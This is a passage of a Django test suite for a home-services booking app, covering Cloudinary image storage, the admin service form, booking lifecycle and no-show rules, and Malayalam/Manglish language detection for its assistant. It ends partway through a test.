    def test_url_returns_https_cloudinary_url(self):
        import sys
        from unittest.mock import MagicMock, patch

        storage = self._storage()
        fake_sdk = MagicMock()
        fake_sdk.utils.cloudinary_url.return_value = (
            'https://res.cloudinary.com/test-cloud/image/upload/'
            'services/pic', {},
        )
        with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
            url = storage.url('services/pic.gif')
        self.assertTrue(url.startswith('https://res.cloudinary.com/'))
        self.assertIn('services/pic', url)
        self.assertNotIn('.gif.gif', url)

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_cloudinary_path_raises_not_local_path(self):
        """path() on a remote object raises; it must never forge a path."""
        import sys
        from unittest.mock import MagicMock, patch

        storage = self._storage()
        fake_sdk = MagicMock()
        with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
            with self.assertRaises(NotImplementedError):
                storage.path('services/pic.gif')

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_upload_failure_logs_without_secrets(self):
        """An SDK outage is logged tagged, with the secret scrubbed."""
        import sys
        from unittest.mock import MagicMock, patch

        storage = self._storage()
        fake_sdk = MagicMock()
        fake_sdk.uploader.upload.side_effect = Exception(
            'boom api_secret=test-secret-not-a-real-credential'
        )
        with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
            with self.assertLogs(
                'lamoapp.cloudinary_storage', level='ERROR',
            ) as captured:
                with self.assertRaises(Exception):
                    storage.save('services/fail.gif', self._tiny_gif())
        log_text = '\n'.join(captured.output)
        self.assertIn('cloudinary_upload_failed', log_text)
        self.assertNotIn('test-secret-not-a-real-credential', log_text)

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_delete_calls_destroy_with_invalidate(self):
        import sys
        from unittest.mock import MagicMock, patch

        storage = self._storage()
        fake_sdk = MagicMock()
        with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
            storage.delete('workers/gone.gif')
        _, kwargs = fake_sdk.uploader.destroy.call_args
        self.assertTrue(kwargs.get('invalidate', False))
        self.assertEqual(kwargs.get('resource_type'), 'image')

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_service_image_end_to_end_uses_cloudinary(self):
        """Saving a Service with an image goes through the SDK path."""
        import sys
        from unittest.mock import MagicMock, patch
        from django.test.utils import override_settings as _override

        fake_sdk = MagicMock()
        with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
            with tempfile.TemporaryDirectory() as tmp:
                with _override(MEDIA_ROOT=tmp):
                    service = Service.objects.create(
                        name='CloudSvc', description='d',
                        price=Decimal('500.00'), is_active=True,
                        image=self._tiny_gif('svc.gif'),
                    )
        self.assertTrue(fake_sdk.uploader.upload.called)
        self.assertTrue(
            service.image.name.replace('\\', '/').startswith('services/')
        )
        self.assertNotIn('cloudinary', service.image.name)

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_proof_download_still_serves_local_file(self):
        """Admin proof download works unchanged with the router active."""
        from django.test.utils import override_settings as _override

        with tempfile.TemporaryDirectory() as tmp:
            with _override(MEDIA_ROOT=tmp):
                admin = _make_user('cloud_admin', role='ADMIN')
                worker_user = _make_user('cloud_worker', role='WORKER')
                profile = WorkerProfile.objects.create(
                    user=worker_user,
                    phone='9876543210',
                    service=None,
                    proof_type='aadhaar',
                    proof_document=SimpleUploadedFile(
                        'proof.pdf', b'%PDF-1.4 proof-bytes',
                        content_type='application/pdf',
                    ),
                )
                self.client.force_login(admin)
                response = self.client.get(
                    reverse('worker_proof_document', args=[profile.pk])
                )
                body = b''.join(response.streaming_content)
                # Release the file handle before the temp dir is torn down:
                # Windows cannot delete an open file (WinError 32).
                response.close()
        self.assertEqual(response.status_code, 200)
        self.assertTrue(
            response['Content-Disposition'].startswith('attachment;')
        )
        self.assertIn(b'proof-bytes', body)

    def test_deconstruct_matches_filesystem_storage(self):
        """No migration churn: same deconstruct args as FileSystemStorage.

        The class *path* legitimately differs (that is the point), but the
        args/kwargs are identical and - crucially - no model field passes a
        ``storage=`` kwarg, so field deconstruction output is unchanged and
        ``makemigrations --check`` stays clean (asserted in CI).
        """
        from django.core.files.storage import FileSystemStorage

        from lamoapp.cloudinary_storage import PrefixCloudinaryStorage
        ours = PrefixCloudinaryStorage().deconstruct()
        plain = FileSystemStorage().deconstruct()
        self.assertEqual(ours[1:], plain[1:])

    def test_test_settings_blank_cloudinary_credentials(self):
        """The suite never points at a real Cloudinary account."""
        import lamo.settings_test as st
        self.assertEqual(st.CLOUDINARY_CLOUD_NAME, '')
        self.assertEqual(st.CLOUDINARY_API_KEY, '')
        self.assertEqual(st.CLOUDINARY_API_SECRET, '')

class AdminServiceCreateFlowTest(TestCase):
    """The admin "Add Service" flow (service_create) must work end to end.

    Regression coverage for the production audit: Service.name is unique, so a
    duplicate submission must surface as a friendly form error (HTTP 200) and
    never as an unhandled IntegrityError (HTTP 500).
    """

    def setUp(self):
        self.admin = _make_user('svc_admin', role='ADMIN')
        self.client.login(username='svc_admin', password='Password123!')

    def test_admin_can_open_the_add_service_form(self):
        response = self.client.get(reverse('service_create'))
        self.assertEqual(response.status_code, 200)
        self.assertIn('form', response.context)

    def test_admin_can_create_a_service(self):
        response = self.client.post(reverse('service_create'), {
            'name': 'Plumbing',
            'description': 'Pipe and tap work',
            'price': '500',
            'is_active': 'on',
        })
        self.assertEqual(response.status_code, 302)
        self.assertTrue(Service.objects.filter(name='Plumbing').exists())

    def test_duplicate_name_is_a_form_error_not_a_500(self):
        Service.objects.create(
            name='Plumbing', description='x', price=Decimal('10.00'), is_active=True,
        )
        response = self.client.post(reverse('service_create'), {
            'name': 'Plumbing',
            'description': 'duplicate',
            'price': '100',
            'is_active': 'on',
        })
        # ModelForm re-renders with a validation error instead of raising.
        self.assertEqual(response.status_code, 200)
        self.assertEqual(Service.objects.filter(name='Plumbing').count(), 1)
        self.assertTrue(response.context['form'].errors)

    def test_non_numeric_price_is_a_form_error_not_a_500(self):
        response = self.client.post(reverse('service_create'), {
            'name': 'Electrical',
            'description': 'Wiring',
            'price': 'not-a-number',
            'is_active': 'on',
        })
        self.assertEqual(response.status_code, 200)
        self.assertFalse(Service.objects.filter(name='Electrical').exists())

    def test_missing_name_is_a_form_error_not_a_500(self):
        response = self.client.post(reverse('service_create'), {
            'name': '',
            'description': 'No name',
            'price': '10',
        })
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context['form'].errors)

    def test_worker_cannot_create_a_service(self):
        worker_user = _make_user('svc_worker', role='WORKER')
        self.client.logout()
        self.client.login(username=worker_user.username, password='Password123!')
        response = self.client.post(reverse('service_create'), {
            'name': 'ShouldNotExist',
            'description': 'x',
            'price': '10',
        })
        self.assertEqual(response.status_code, 302)
        self.assertFalse(Service.objects.filter(name='ShouldNotExist').exists())

    def test_user_cannot_create_a_service(self):
        customer = _make_user('svc_customer', role='USER')
        self.client.logout()
        self.client.login(username=customer.username, password='Password123!')
        response = self.client.post(reverse('service_create'), {
            'name': 'AlsoNot',
            'description': 'x',
            'price': '10',
        })
        self.assertEqual(response.status_code, 302)
        self.assertFalse(Service.objects.filter(name='AlsoNot').exists())

    # ------------------------------------------------------------------
    # Regression coverage for the production "Admin -> Add Service fails"
    # defect. Root cause: a bare ``import cloudinary`` does not expose
    # ``cloudinary.uploader`` (SDK 1.x), so any submission carrying an
    # image raised AttributeError inside form.save() -> HTTP 500.
    # ------------------------------------------------------------------

    def _tiny_gif(self, name='tiny.gif'):
        # 1x1 GIF: Pillow-valid so ImageField validation passes.
        return SimpleUploadedFile(
            name,
            b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00'
            b'\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,'
            b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;',
            content_type='image/gif',
        )

    def test_configure_cloudinary_exposes_uploader_submodule(self):
        """The storage layer must expose ``cloudinary.uploader`` after config.

        With the submodule left un-imported (bare ``import cloudinary``),
        ``cloudinary.uploader.upload`` raises AttributeError and every
        image-bearing Add Service POST 500s. The submodule is popped first
        so a previously-imported copy can never mask the regression, and
        every ``cloudinary*`` entry is restored afterwards: other tests
        assert the suite never leaves the SDK imported when unconfigured.
        """
        import sys

        from lamoapp.cloudinary_storage import _configure_cloudinary

        def _sdk_keys():
            return [
                k for k in sys.modules
                if k == 'cloudinary' or k.startswith('cloudinary.')
            ]

        before = {k: sys.modules[k] for k in _sdk_keys()}
        saved_attr = None
        try:
            import cloudinary

            saved_attr = cloudinary.__dict__.pop('uploader', None)
            sys.modules.pop('cloudinary.uploader', None)
            configured = _configure_cloudinary()
            self.assertTrue(
                hasattr(configured, 'uploader'),
                '_configure_cloudinary() must expose cloudinary.uploader - '
                'otherwise every image upload dies inside form.save()',
            )
        finally:
            if saved_attr is not None and 'cloudinary' in before:
                before['cloudinary'].__dict__['uploader'] = saved_attr
            for key in _sdk_keys():
                if key not in before:
                    del sys.modules[key]
            sys.modules.update(before)

    def test_admin_can_add_a_service_with_an_image(self):
        """An image-bearing submission reaches the SDK and saves cleanly."""
        import sys
        from unittest.mock import MagicMock, patch

        # Shared dummy-shaped settings - never real credentials (see
        # PrefixCloudinaryStorageTest.CLOUDINARY_SETTINGS).
        with override_settings(**PrefixCloudinaryStorageTest.CLOUDINARY_SETTINGS):
            fake_sdk = MagicMock()
            with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
                response = self.client.post(reverse('service_create'), {
                    'name': 'Painting',
                    'description': 'Wall and ceiling painting',
                    'price': '750',
                    'is_active': 'on',
                    'image': self._tiny_gif('paint.gif'),
                })
        self.assertEqual(response.status_code, 302)
        self.assertTrue(fake_sdk.uploader.upload.called)
        service = Service.objects.get(name='Painting')
        # Django joins upload_to with os.sep (backslash on Windows).
        self.assertTrue(
            service.image.name.replace('\\', '/').startswith('services/')
        )

    def test_storage_failure_is_a_friendly_error_not_a_500(self):
        """A Cloudinary outage re-renders with a message instead of a 500."""
        import sys
        from unittest.mock import MagicMock, patch

        fake_sdk = MagicMock()
        fake_sdk.uploader.upload.side_effect = Exception(
            'boom api_secret=test-secret-not-a-real-credential'
        )
        with override_settings(**PrefixCloudinaryStorageTest.CLOUDINARY_SETTINGS):
            with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
                response = self.client.post(reverse('service_create'), {
                    'name': 'BrokenUpload',
                    'description': 'Never saved',
                    'price': '10',
                    'is_active': 'on',
                    'image': self._tiny_gif('broken.gif'),
                })
        # Friendly re-render of the form page - never an unhandled 500.
        self.assertEqual(response.status_code, 200)
        self.assertFalse(Service.objects.filter(name='BrokenUpload').exists())
        self.assertContains(response, 'Could not save the service')
        # The raw exception (and any echoed secret) must not reach the page.
        self.assertNotContains(response, 'test-secret-not-a-real-credential')

    def test_created_service_persists_expected_fields(self):
        """Every submitted field lands on the saved Service row."""
        response = self.client.post(reverse('service_create'), {
            'name': 'AC Repair',
            'description': 'Split and window AC service',
            'price': '1299.50',
            'is_active': 'on',
            'is_featured': 'on',
        })
        self.assertEqual(response.status_code, 302)
        service = Service.objects.get(name='AC Repair')
        self.assertEqual(service.description, 'Split and window AC service')
        self.assertEqual(service.price, Decimal('1299.50'))
        self.assertTrue(service.is_active)
        self.assertTrue(service.is_featured)

    def test_non_image_upload_is_a_form_error_not_a_500(self):
        """A non-image payload is rejected by validation, not a crash."""
        response = self.client.post(reverse('service_create'), {
            'name': 'NotAnImage',
            'description': 'x',
            'price': '10',
            'is_active': 'on',
            'image': SimpleUploadedFile(
                'payload.txt', b'definitely not an image',
                content_type='text/plain',
            ),
        })
        self.assertEqual(response.status_code, 200)
        self.assertFalse(Service.objects.filter(name='NotAnImage').exists())
        self.assertTrue(response.context['form'].errors)

    def test_existing_services_are_unchanged_by_a_new_creation(self):
        """Adding one service never mutates the services already listed."""
        first = Service.objects.create(
            name='Old One', description='first',
            price=Decimal('11.00'), is_active=True,
        )
        second = Service.objects.create(
            name='Old Two', description='second',
            price=Decimal('22.00'), is_active=False,
        )
        response = self.client.post(reverse('service_create'), {
            'name': 'Brand New',
            'description': 'third',
            'price': '33',
            'is_active': 'on',
        })
        self.assertEqual(response.status_code, 302)
        self.assertEqual(Service.objects.count(), 3)
        first.refresh_from_db()
        second.refresh_from_db()
        self.assertEqual(first.description, 'first')
        self.assertEqual(first.price, Decimal('11.00'))
        self.assertTrue(first.is_active)
        self.assertEqual(second.description, 'second')
        self.assertEqual(second.price, Decimal('22.00'))
        self.assertFalse(second.is_active)


class LegalPagesTest(TestCase):
    """Verifies that Terms & Conditions and Privacy Policy pages are accessible,
    properly routed, linked in the base footer, and contain mandatory legal disclosures.
    """

    def test_terms_url_resolves_and_renders(self):
        url = reverse('terms')
        self.assertEqual(url, '/terms/')
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'legal/terms.html')
        content = response.content.decode('utf-8')
        self.assertIn('Terms &amp; Conditions', content)
        self.assertIn('Platform Nature &amp; Scope', content)
        self.assertIn('Cancellation &amp; Refund Policy', content)
        self.assertIn('Worker Liability &amp; Disclaimers', content)
        self.assertIn('Data Protection &amp; Confidentiality', content)

    def test_privacy_url_resolves_and_renders(self):
        url = reverse('privacy')
        self.assertEqual(url, '/privacy/')
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'legal/privacy.html')
        content = response.content.decode('utf-8')
        self.assertIn('Privacy Policy', content)
        self.assertIn('Information We Collect', content)
        self.assertIn('Third-Party Data Sharing', content)
        self.assertIn('Data Retention &amp; Deletion', content)
        self.assertIn('Grievance Redressal', content)

    def test_footer_contains_terms_and_privacy_links(self):
        session = self.client.session
        session['lamo_splash_shown'] = True
        session.save()
        response = self.client.get(reverse('home'))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode('utf-8')
        self.assertIn('href="/terms/"', content)
        self.assertIn('href="/privacy/"', content)


class P1BookingLifecycleAndCancellationTests(TestCase):
    """
    Regression test suite for P1 Booking Lifecycle, Service Completion &
    Payment Confirmation, and Cancellation & No-Show flows.
    """

    def setUp(self):
        from .models import StrikeRecord
        self.StrikeRecord = StrikeRecord
        from .views import _is_valid_booking_transition, check_and_expire_pending_bookings
        self._is_valid_booking_transition = _is_valid_booking_transition
        self.check_and_expire_pending_bookings = check_and_expire_pending_bookings

        # Create service
        self.service = Service.objects.create(
            name="Electrical Repair",
            description="Professional electrical repairs and installations",
            price=350.00,
            is_active=True
        )

        # Create customer
        self.customer = CustomUser.objects.create_user(
            username="customer_p1",
            email="cust_p1@example.com",
            password="Password123!",
            role="USER",
            is_email_verified=True,
            first_name="Anita",
            last_name="Roy"
        )

        # Create worker user and profile
        self.worker_user = CustomUser.objects.create_user(
            username="worker_p1",
            email="worker_p1@example.com",
            password="Password123!",
            role="WORKER",
            is_email_verified=True,
            first_name="Ramesh",
            last_name="Kumar"
        )
        self.worker_profile = WorkerProfile.objects.create(
            user=self.worker_user,
            service=self.service,
            district="Ernakulam",
            work_status="AVAILABLE",
            is_verified=True,
            pricing_amount=Decimal("400.00")
        )

        # Booking defaults
        self.booking_date = date_type.today() + timedelta(days=2)
        self.booking_time = "14:00"
        self.booking = Booking.objects.create(
            customer=self.customer,
            worker=self.worker_profile,
            service=self.service,
            date=self.booking_date,
            time=self.booking_time,
            location="123 Park Avenue, MG Road",
            phone="9876543210",
            status="PENDING",
            estimated_cost=Decimal("350.00"),
            latitude=12.9716,
            longitude=77.5946
        )

    def test_status_transition_matrix(self):
        # Valid forward transitions
        self.assertTrue(self._is_valid_booking_transition('PENDING', 'ACCEPTED'))
        self.assertTrue(self._is_valid_booking_transition('PENDING', 'REJECTED'))
        self.assertTrue(self._is_valid_booking_transition('PENDING', 'CANCELLED'))
        self.assertTrue(self._is_valid_booking_transition('PENDING', 'EXPIRED'))

        self.assertTrue(self._is_valid_booking_transition('ACCEPTED', 'IN_PROGRESS'))
        self.assertTrue(self._is_valid_booking_transition('ACCEPTED', 'CANCELLED'))

        self.assertTrue(self._is_valid_booking_transition('IN_PROGRESS', 'COMPLETION_REQUESTED'))
        self.assertTrue(self._is_valid_booking_transition('COMPLETION_REQUESTED', 'COMPLETED'))
        self.assertTrue(self._is_valid_booking_transition('COMPLETION_REQUESTED', 'DISPUTED'))
        self.assertTrue(self._is_valid_booking_transition('DISPUTED', 'COMPLETED'))
        self.assertTrue(self._is_valid_booking_transition('DISPUTED', 'CANCELLED'))

        # Terminal and invalid backward transitions
        self.assertFalse(self._is_valid_booking_transition('COMPLETED', 'PENDING'))
        self.assertFalse(self._is_valid_booking_transition('COMPLETED', 'ACCEPTED'))
        self.assertFalse(self._is_valid_booking_transition('CANCELLED', 'IN_PROGRESS'))
        self.assertFalse(self._is_valid_booking_transition('EXPIRED', 'ACCEPTED'))
        self.assertFalse(self._is_valid_booking_transition('REJECTED', 'IN_PROGRESS'))

    def test_30_min_response_timer_auto_expiry(self):
        # Age the booking beyond 30 minutes
        older_time = timezone.now() - timedelta(minutes=32)
        Booking.objects.filter(id=self.booking.id).update(created_at=older_time)

        # Trigger check and expiry
        expired_bookings = self.check_and_expire_pending_bookings(booking=self.booking)
        self.assertEqual(len(expired_bookings), 1)

        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'EXPIRED')

        # Check customer received notification
        notif = Notification.objects.filter(recipient=self.customer).order_by('-created_at').first()
        self.assertIsNotNone(notif)
        self.assertIn('expired', notif.message.lower())

    def test_book_service_prefill_parameters(self):
        self.client.login(username="customer_p1", password="Password123!")
        url = reverse('book_service') + f'?service={self.service.id}&date=2026-11-25&time=11:00&location=Lakeview%20Road&phone=9123456789'
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertIn('prefill_data', response.context)
        self.assertEqual(response.context['prefill_data']['date'], '2026-11-25')
        self.assertEqual(response.context['prefill_data']['time'], '11:00')
        self.assertEqual(response.context['prefill_data']['location'], 'Lakeview Road')
        self.assertEqual(response.context['prefill_data']['phone'], '9123456789')

    def test_arrival_otp_generation_and_start_job_verification(self):
        # Booking has auto-generated OTP
        self.assertTrue(bool(self.booking.arrival_otp))
        self.assertEqual(len(self.booking.arrival_otp), 4)

        # Transition to ACCEPTED
        self.booking.status = 'ACCEPTED'
        self.booking.save()

        # Worker logs in
        self.client.login(username="worker_p1", password="Password123!")

        # 1. Starting job without OTP or with wrong OTP fails
        start_url = reverse('worker_start_job', args=[self.booking.id])
        resp_bad = self.client.post(start_url, {'arrival_otp': '0000'})
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'ACCEPTED')
        self.assertIsNone(self.booking.arrival_verified_at)

        # 2. Starting job with correct OTP succeeds
        resp_good = self.client.post(start_url, {'arrival_otp': self.booking.arrival_otp})
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'IN_PROGRESS')
        self.assertIsNotNone(self.booking.arrival_verified_at)

    def test_worker_request_completion_and_customer_confirm(self):
        self.booking.status = 'IN_PROGRESS'
        self.booking.save()

        # Worker submits completion request with final amount of ₹500
        self.client.login(username="worker_p1", password="Password123!")
        comp_url = reverse('worker_request_completion', args=[self.booking.id])
        resp = self.client.post(comp_url, {'final_amount': '500.00'})
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'COMPLETION_REQUESTED')
        self.assertEqual(self.booking.final_amount, Decimal('500.00'))

        # Customer logs in and confirms completion
        self.client.login(username="customer_p1", password="Password123!")
        confirm_url = reverse('confirm_completion', args=[self.booking.id])
        resp_confirm = self.client.post(confirm_url)
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'COMPLETED')
        self.assertEqual(self.booking.estimated_cost, Decimal('500.00'))

    def test_customer_disputes_completion_amount_creates_complaint(self):
        self.booking.status = 'COMPLETION_REQUESTED'
        self.booking.final_amount = Decimal('800.00')
        self.booking.save()

        self.client.login(username="customer_p1", password="Password123!")
        dispute_url = reverse('dispute_booking', args=[self.booking.id])
        resp = self.client.post(dispute_url, {
            'dispute_reason': 'Worker charged ₹800 instead of initial ₹350 without explanation.'
        })

        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'DISPUTED')
        self.assertIn('800 instead of initial', self.booking.dispute_reason)

        # Verify Complaint record created
        complaint = Complaint.objects.filter(booking=self.booking).first()
        self.assertIsNotNone(complaint)
        self.assertEqual(complaint.customer, self.customer)
        self.assertEqual(complaint.booking.worker, self.worker_profile)
        self.assertEqual(complaint.severity, 'HIGH')

    def test_customer_cancellation_stores_reason(self):
        self.client.login(username="customer_p1", password="Password123!")
        cancel_url = reverse('cancel_booking', args=[self.booking.id])
        resp = self.client.post(cancel_url, {
            'cancellation_reason': 'Need to reschedule for next week.'
        })

        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'CANCELLED')
        self.assertEqual(self.booking.cancelled_by, 'CUSTOMER')
        self.assertEqual(self.booking.cancellation_reason, 'Need to reschedule for next week.')

    def test_worker_late_cancellation_logs_strike(self):
        self.booking.status = 'ACCEPTED'
        self.booking.save()

        self.client.login(username="worker_p1", password="Password123!")
        worker_cancel_url = reverse('worker_cancel_booking', args=[self.booking.id])
        resp = self.client.post(worker_cancel_url, {
            'cancellation_reason': 'Motorbike breakdown on highway.'
        })

        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'CANCELLED')
        self.assertEqual(self.booking.cancelled_by, 'WORKER')
        self.assertEqual(self.booking.cancellation_reason, 'Motorbike breakdown on highway.')

        # Verify StrikeRecord
        strike = self.StrikeRecord.objects.filter(worker=self.worker_profile, booking=self.booking).first()
        self.assertIsNotNone(strike)
        self.assertEqual(strike.strike_type, 'WORKER_LATE_CANCELLATION')
        self.assertEqual(strike.status, 'PENDING_REVIEW')

    def test_customer_report_worker_no_show_timing(self):
        self.booking.status = 'ACCEPTED'
        self.booking.save()

        self.client.login(username="customer_p1", password="Password123!")
        report_url = reverse('report_worker_no_show', args=[self.booking.id])

        # 1. Booking scheduled in future (2 days ahead) - should be rejected
        resp_premature = self.client.post(report_url, {'notes': 'Worker is not here!'})
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'ACCEPTED')

        # 2. Set booking date to yesterday (well past scheduled time + 30 mins)
        self.booking.date = date_type.today() - timedelta(days=1)
        self.booking.save()

        resp_valid = self.client.post(report_url, {'notes': 'Waited over an hour, worker did not arrive.'})
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'CANCELLED')
        self.assertIsNotNone(self.booking.worker_no_show_reported_at)

        # Strike logged
        strike = self.StrikeRecord.objects.filter(worker=self.worker_profile, booking=self.booking).first()
        self.assertIsNotNone(strike)
        self.assertEqual(strike.strike_type, 'WORKER_NO_SHOW')

    def test_worker_report_customer_no_show_gps_and_waiting_validation(self):
        self.booking.status = 'ACCEPTED'
        self.booking.date = date_type.today() - timedelta(days=1)
        self.booking.save()

        self.client.login(username="worker_p1", password="Password123!")
        report_url = reverse('worker_report_customer_no_show', args=[self.booking.id])

        # 1. Waiting less than 15 minutes rejected
        resp_short_wait = self.client.post(report_url, {
            'waiting_minutes': '5',
            'latitude': '12.9716',
            'longitude': '77.5946'
        })
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'ACCEPTED')

        # 2. GPS far away (> 1 km from 12.9716, 77.5946) rejected
        resp_far_gps = self.client.post(report_url, {
            'waiting_minutes': '20',
            'latitude': '13.0827',  # Chennai, ~290km away
            'longitude': '80.2707'
        })
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'ACCEPTED')

        # 3. Valid doorstep GPS (within 100 meters) and >= 15 min wait accepted
        resp_valid = self.client.post(report_url, {
            'waiting_minutes': '20',
            'latitude': '12.9717',
            'longitude': '77.5947',
            'notes': 'Door bell unanswered, phone switched off.'
        })
        self.booking.refresh_from_db()
        self.assertEqual(self.booking.status, 'CANCELLED')
        self.assertIsNotNone(self.booking.customer_no_show_reported_at)


        # Strike logged for customer no show
        strike = self.StrikeRecord.objects.filter(worker=self.worker_profile, booking=self.booking).first()
        self.assertIsNotNone(strike)
        self.assertEqual(strike.strike_type, 'CUSTOMER_NO_SHOW')


# ==========================================================================
# MULTILINGUAL AI ASSISTANT TESTS
# Covers Malayalam, Manglish, English, spelling variations, mixed queries
# ==========================================================================

class MultilingualLanguageDetectionTest(TestCase):
    """Unit tests for detect_user_language() in ai_utils."""

    def _detect(self, text):
        from lamoapp.ai_utils import detect_user_language
        return detect_user_language(text)

    # --- Malayalam script ---
    def test_malayalam_cleaner_request(self):
        self.assertEqual(self._detect('\u0d0e\u0d28\u0d3f\u0d15\u0d4d\u0d15\u0d4d \u0d12\u0d30\u0d41 \u0d15\u0d4d\u0d32\u0d40\u0d28\u0d31\u0d46 \u0d35\u0d47\u0d23\u0d02'), 'malayalam')

    def test_malayalam_plumber_request(self):
        self.assertEqual(self._detect('\u0d2a\u0d4d\u0d32\u0d02\u0d2c\u0d7c \u0d35\u0d47\u0d23\u0d02'), 'malayalam')

    def test_malayalam_electrician_request(self):
        self.assertEqual(self._detect('\u0d07\u0d32\u0d15\u0d4d\u0d1f\u0d4d\u0d30\u0d40\u0d37\u0d4d\u0d2f\u0d7b \u0d35\u0d47\u0d23\u0d02'), 'malayalam')

    def test_malayalam_greeting(self):
        self.assertEqual(self._detect('\u0d28\u0d2e\u0d38\u0d4d\u0d15\u0d3e\u0d30\u0d02'), 'malayalam')

    def test_malayalam_how_are_you(self):
        self.assertEqual(self._detect('\u0d38\u0d41\u0d16\u0d2e\u0d3e\u0d23\u0d4b'), 'malayalam')

    def test_malayalam_carpenter(self):
        self.assertEqual(self._detect('\u0d12\u0d30\u0d41 \u0d06\u0d36\u0d3e\u0d30\u0d3f \u0d35\u0d47\u0d23\u0d02'), 'malayalam')

    def test_malayalam_painter(self):
        self.assertEqual(self._detect('\u0d2a\u0d46\u0d2f\u0d3f\u0d28\u0d4d\u0d31\u0d31\u0d46 \u0d35\u0d47\u0d23\u0d02'), 'malayalam')

    # --- Manglish ---
    def test_manglish_electrician_request(self):
        self.assertEqual(self._detect('Enik oru electrician venam'), 'manglish')

    def test_manglish_plumber_request(self):
        self.assertEqual(self._detect('Oru plumber venam'), 'manglish')

    def test_manglish_cleaner_request(self):
        self.assertEqual(self._detect('oru cleaner venam'), 'manglish')

    def test_manglish_namaskaram(self):
        self.assertEqual(self._detect('namaskaram'), 'manglish')

    def test_manglish_sugamano(self):
        self.assertEqual(self._detect('sugamano'), 'manglish')

    def test_manglish_undo_suffix(self):
        self.assertEqual(self._detect('plambur undo'), 'manglish')

    def test_manglish_njan(self):
        self.assertEqual(self._detect('njan oru electrician thedi'), 'manglish')

    def test_manglish_mixed_english_words(self):
        self.assertEqual(self._detect('Enik oru carpenter aavashyam'), 'manglish')

    # --- English ---
    def test_english_electrician(self):
        self.assertEqual(self._detect('I need an electrician'), 'english')

    def test_english_plumber(self):
        self.assertEqual(self._detect('Can I get a plumber?'), 'english')

    def test_english_greeting(self):
        self.assertEqual(self._detect('Hello, how are you'), 'english')

    def test_english_cleaner(self):
        self.assertEqual(self._detect('I need a house cleaner'), 'english')

    # --- Edge cases ---
    def test_empty_string_returns_english(self):
        self.assertEqual(self._detect(''), 'english')

    def test_none_returns_english(self):
        self.assertEqual(self._detect(None), 'english')


class MultilingualServiceSynonymTest(TestCase):
    """Unit tests for SERVICE_SYNONYM_MAP keyword resolution in match_service_and_workers."""

    def setUp(self):
        self.electrician_service = Service.objects.create(
            name='Electrician', description='Wiring, fuse, electrical repairs',
            price=500.00, is_active=True
        )
        self.plumber_service = Service.objects.create(
            name='Plumbing', description='Pipe fitting, leak repair',
            price=400.00, is_active=True
        )
        self.cleaner_service = Service.objects.create(
            name='Cleaning', description='House cleaning service',
            price=600.00, is_active=True
        )
        self.carpenter_service = Service.objects.create(
            name='Carpentry', description='Wood and furniture work',
            price=700.00, is_active=True
        )
        self.painter_service = Service.objects.create(
            name='Painting', description='Wall painting and whitewash',
            price=800.00, is_active=True
        )

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_english_electrician(self, _):
        res = match_service_and_workers('I need an electrician')
        self.assertIsNotNone(res['service'])
        self.assertIn('electric', res['service'].name.lower())

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_english_plumber(self, _):
        res = match_service_and_workers('Can I get a plumber?')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_electrician_venam(self, _):
        res = match_service_and_workers('Enik oru electrician venam')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_plumber_venam(self, _):
        res = match_service_and_workers('Oru plumber venam')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_plambur_spelling(self, _):
        res = match_service_and_workers('plambur undo')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_electrisian_spelling(self, _):
        res = match_service_and_workers('electrisian venam')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_currentkaran(self, _):
        res = match_service_and_workers('currentkaran venam')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_marapani_carpenter(self, _):
        res = match_service_and_workers('marapani cheyyam')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_veedu_clean(self, _):
        res = match_service_and_workers('veedu clean cheyyam')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_malayalam_cleaner_request(self, _):
